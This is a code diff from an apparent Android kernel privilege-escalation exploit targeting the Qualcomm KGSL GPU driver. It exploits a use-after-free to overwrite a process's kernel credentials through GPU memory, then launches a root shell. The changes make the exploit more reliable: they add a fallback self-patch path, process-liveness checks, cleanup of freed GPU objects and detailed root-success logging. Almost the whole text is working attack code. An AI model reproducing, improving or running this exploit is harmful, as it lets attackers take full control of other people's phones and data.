@@ -1240,43 +1240,41 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
 
 static void safe_cred_patch(void)
 {
+    fprintf(stderr, "[CHILD %d] Activation triggered! gbuf[0]=0x%02x\n", getpid(), (uint8_t)gbuf[0]);
+    
     // First, check if parent already patched us
-    if (getuid() == 0) {
-        fprintf(stderr, "[CHILD] [+] I AM ALREADY ROOT! Skipping patching.\n");
+    uid_t current_uid = getuid();
+    fprintf(stderr, "[CHILD %d] Current UID: %d\n", getpid(), current_uid);
+
+    if (current_uid == 0) {
+        fprintf(stderr, "[CHILD %d] [+] I AM ALREADY ROOT! Proceeding to shell.\n", getpid());
         goto shell;
     }
 
-    // Try one last time to elevate if we have the pointer but UIDs aren't 0 yet
+    // Try setuid(0) to trigger kernel cred reload
     setuid(0);
     if (getuid() == 0) {
-        fprintf(stderr, "[CHILD] [+] ROOT SUCCESS after setuid(0)!\n");
+        fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS after setuid(0)!\n", getpid());
         goto shell;
     }
 
-    // If not root, try to open GPU and patch (fallback)
-    if (fd > 0) close(fd);
-    fd = -1;
+    // Fallback: try to patch ourselves if parent missed something
+    fprintf(stderr, "[CHILD %d] Fallback: Parent patch not visible. Trying manual GPU patch...\n", getpid());
     
-    int retry_open = 10;
-    while (retry_open--) {
-        fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
-        if (fd >= 0) break;
-        usleep(200000);
-    }
-
-    if (fd >= 0) {
+    int child_fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
+    if (child_fd >= 0) {
         uint64_t cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
         if (cred_ptr != 0) {
-            fprintf(stderr, "[CHILD] Falling back to manual patch at 0x%lx\n", (unsigned long)cred_ptr);
-            patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
+            patch_cred_via_gpu(child_fd, cred_ptr, cred_ptr);
             setuid(0);
         }
+        close(child_fd);
     }
 
     if (getuid() == 0) {
-        fprintf(stderr, "[CHILD] [+] ROOT SUCCESS via fallback!\n");
+        fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS via fallback!\n", getpid());
     } else {
-        fprintf(stderr, "[CHILD] [!] Elevation FAILED.\n");
+        fprintf(stderr, "[CHILD %d] [!] Elevation FAILED. Still UID %d\n", getpid(), getuid());
         gbuf[GBUF_TASK_SPRAY] = 0x1;
         return;
     }
@@ -1284,8 +1282,13 @@ static void safe_cred_patch(void)
 shell:
     gbuf[GBUF_TASK_SPRAY] = 0x2; // Signal parent
     __sync_synchronize();
-    fprintf(stderr, "[CHILD] [+] Spawning root shell...\n");
-    system("id; /system/bin/sh");
+    fprintf(stderr, "[CHILD %d] [+] Executing root shell...\n", getpid());
+    
+    // Use execl for a cleaner shell transition
+    execl("/system/bin/sh", "sh", "-i", NULL);
+    
+    // If execl fails, fallback to system
+    system("/system/bin/sh");
     exit(0);
 }
 
@@ -2646,6 +2649,13 @@ restart:;
 
     pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
     fprintf(stderr, "[+] Target identified: PID %d. Cleaning up spray...\n", target_pid);
+    
+    // Check if target is still alive
+    if (kill(target_pid, 0) != 0) {
+        fprintf(stderr, "[!] ERROR: Target PID %d died before patching!\n", target_pid);
+        gbuf[GBUF_TASK_SPRAY] = 0x1;
+    }
+
     fprintf(stderr, "[*] Parent will perform patching for maximum stability.\n");
 
     int reaped = 0;
@@ -2680,6 +2690,11 @@ restart:;
         if (overlap_vma && overlap_vma != MAP_FAILED) munmap(overlap_vma, overlap_mmapsize);
         if (ph_vma && ph_vma != MAP_FAILED) munmap(ph_vma, ph_mmapsize);
         if (bogus_vma && bogus_vma != MAP_FAILED) munmap(bogus_vma, PAGE_SIZE * 3);
+        
+        struct kgsl_gpuobj_free fr = {0};
+        if (g_uaf_id > 0) { fr.id = g_uaf_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
+        if (overlap_id) { fr.id = overlap_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
+        if (ph_id) { fr.id = ph_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
         
         close(fd);
         fd = -1;
